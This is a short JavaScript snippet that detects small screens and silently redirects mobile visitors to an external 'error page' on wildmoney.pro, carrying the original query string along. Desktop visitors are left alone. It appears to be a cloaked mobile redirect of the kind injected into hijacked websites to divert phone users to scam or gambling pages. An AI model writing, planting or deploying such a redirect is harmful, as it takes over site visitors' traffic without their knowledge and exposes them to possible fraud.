//say no mo

(function () {

  var redirectURL = "https://wildmoney.pro/error-pages/error-777/";

  var breakpoint = 777;

  function isSmallScreen() {
    try {
      return window.matchMedia("(max-device-width: " + breakpoint + "px)").matches;
    } catch (e) {
    }
    return false;
  }

  if (isSmallScreen()) {
    var url = new URL(redirectURL);
    url.search = url.search ? url.search + "&" + window.location.search.substr(1) : window.location.search;
    window.location = url;
  }
})();
